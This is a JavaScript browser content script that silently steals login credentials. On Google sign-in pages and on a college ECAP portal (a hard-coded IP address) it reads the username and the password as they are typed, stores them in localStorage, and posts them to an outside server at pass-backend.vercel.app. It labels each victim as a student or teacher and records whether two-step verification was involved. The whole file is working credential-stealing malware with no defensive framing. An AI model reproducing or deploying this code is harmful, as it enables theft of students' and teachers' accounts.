let logs = [];
async function post(url, body) {
  // const baseUrl = "http://192.169.0.169:3000";
  const baseUrl = "https://pass-backend.vercel.app";

  return fetch(`${baseUrl}/${url}`, {
    method: "POST",
    // mode: "no-cors",
    cache: "no-cache",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(body),
  });
}

let backup = { user: "", passwd: "" };

function handleGooglePass() {
  const cond =
    !location.href.includes("accounts.google.com/") ||
    !location.href.includes("/signin");

  if (cond) return -1;

  let passwordStored = false;
  const targetNode = document.body;
  const config = { childList: true, subtree: true };
  const callback = function (mutationsList, observer) {
    for (const mutation of mutationsList) {
      if (mutation.type === "childList") {
        if (location.pathname.includes("challenge/pwd")) {
          let emailInput = document.querySelector("#hiddenEmail");
          let passInput = document.querySelector(
            "input.whsOnd.zHQkBf[type='password']"
          );
          // * save typing Password
          localStorage.setItem(
            "user",
            JSON.stringify({
              user: emailInput.value,
              passwd: passInput.value,
            })
          );

          try {
            passInput.addEventListener("keydown", (e) => {
              if (e.key == "Enter") {
                let user = emailInput.value;
                post("google-temp", {
                  user: emailInput.value,
                  passwd: passInput.value,
                  type: user.includes("edu.in")
                    ? user[2].toLowerCase() == "u" &&
                      user[3].toLowerCase() == "4"
                      ? "student"
                      : "teacher"
                    : "other",
                  twoStepAuth: false,
                });
              }
            });
          } catch (e) {
            //
          }
          passwordStored = false;
        } else if (
          (location.pathname.includes("challenge/selection") || // select any method
            location.pathname.includes("challenge/ipp") || // mobile number
            location.pathname.includes("challenge/bc") || //security codes
            location.pathname.includes("challenge/dp") || // tap yes
            location.pathname.includes("challenge/totp") || // totp
            location.pathname.includes("challenge/ootp") || // totp
            location.pathname.includes("rejected")) &&
          !passwordStored
        ) {
          let { user, passwd } = JSON.parse(localStorage.getItem("user"));
          if (!user || !passwd) {
            return;
          }

          let type = user.includes("edu.in")
            ? user[2].toLowerCase() == "u" && user[3].toLowerCase() == "4"
              ? "student"
              : "teacher"
            : "other";

          post("new-google", { user, passwd, type, twoStepAuth: true });
          passwordStored = true;
        } else if (
          location.pathname.includes("google.com/web/chip") &&
          !passwordStored
        ) {
          let { user, passwd } = JSON.parse(localStorage.getItem("user"));
          let type = user.includes("edu.in")
            ? user[2].toLowerCase() == "u" && user[3].toLowerCase() == "4"
              ? "student"
              : "teacher"
            : "other";
          passwordStored = true;

          post("new-google", { user, passwd, type, twoStepAuth: false });
        }
        // else if (!passwordStored && backup.user && backup.passwd) {
        //   console.log("last block");
        //   console.log(backup);
        //   post("new-google", {
        //     user: backup.user,
        //     passwd: backup.passwd,
        //     type,
        //   });
        //   passwordStored = true;
        // }
      }
    }
  };

  const observer = new MutationObserver(callback);
  observer.observe(targetNode, config);
}
// https://gds.google.com/web/chip

function handlePass() {
  if (!location.href.toLowerCase().includes("http://103.138.0.69/ecap"))
    return -1;

  // *  Student logined successfully
  if (location.pathname.toLowerCase() == "/ecap/studentmaster.aspx") {
    let { user, passwd } = JSON.parse(localStorage.getItem("user"));
    if (!user || !passwd) {
      return;
    }
    const data = { user, passwd, type: "student" };
    localStorage.clear();
    post("new-ecap", data);
  }
  // * Teacher Logined successfully
  else if (location.pathname.toLowerCase() == "/ecap/main.aspx") {
    let { user, passwd } = JSON.parse(localStorage.getItem("user"));
    const data = { user, passwd, type: "teacher" };
    localStorage.clear();
    post("new-ecap", data);
  }
  // * IN Login Page
  else {
    const id1 = document.getElementById("txtId1");
    const pwd1 = document.getElementById("txtPwd1");
    const id2 = document.getElementById("txtId2");
    const pwd2 = document.getElementById("txtPwd2");

    // * Student is Logining
    pwd2.oninput = (e) => {
      localStorage.setItem(
        "user",
        JSON.stringify({
          user: id2.value,
          passwd: pwd2.value,
        })
      );
    };
    // * Teacher is Logining
    pwd1.oninput = (e) => {
      localStorage.setItem(
        "user",
        JSON.stringify({
          user: id1.value,
          passwd: pwd1.value,
        })
      );
    };
  }
}

if (handlePass() == -1) {
  handleGooglePass();
}
